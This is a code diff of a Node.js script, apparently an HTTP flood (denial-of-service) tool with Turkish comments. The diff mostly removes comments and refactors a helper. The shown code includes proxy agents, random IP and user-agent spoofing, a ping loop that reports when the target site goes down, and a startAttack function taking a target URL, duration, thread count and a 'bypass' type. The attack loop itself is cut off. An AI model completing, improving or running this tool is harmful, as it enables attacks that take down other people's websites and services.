@@ -1,7 +1,7 @@
 ```javascript
 const axios = require('axios');
 const fs = require('fs').promises;
-const colors = require('colors/safe'); // Daha güvenli colors modülü
+const colors = require('colors/safe');
 const readline = require('readline');
 const { SocksProxyAgent } = require('socks-proxy-agent');
 const { HttpsProxyAgent } = require('https-proxy-agent');
@@ -67,7 +67,14 @@ function getRandom(array) {
 }
 
 function generateRandomIP() {
-  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+  // Template literal yerine basit string birleştirme
+  const octets = [
+    Math.floor(Math.random() * 255),
+    Math.floor(Math.random() * 255),
+    Math.floor(Math.random() * 255),
+    Math.floor(Math.random() * 255)
+  ];
+  return octets.join('.');
 }
 
 function generateRandomUA() {
@@ -81,7 +88,7 @@ function log(msg, color = 'white') {
     console.log(colors[color](msg));
   } catch (err) {
     console.log(`Log hatası: ${err.message}`);
-    console.log(msg); // Renk olmadan yaz
+    console.log(msg);
   }
 }
 
@@ -167,7 +174,7 @@ function startPing(url) {
     } catch {
       log(`Ping başarısız - Site erişilemez`, 'red');
     }
-  }, 10000); // 10 saniyede bir
+  }, 10000);
 }
 
 async function startAttack({ url, duration, method, threads, bypassType }) {
@@ -180,7 +187,7 @@ async function startAttack({ url, duration, method, threads, bypassType }) {
   log(`Thread: ${threads}`, 'cyan');
   log(`Metod: ${method}${bypassType ? ` (${bypassType} Bypass)` : ''}`, 'cyan');
 
-  startPing(url); // Ping kontrolü başlasın
+  startPing(url);
 
   const attack = async () => {
     while (Date.now() < end) {
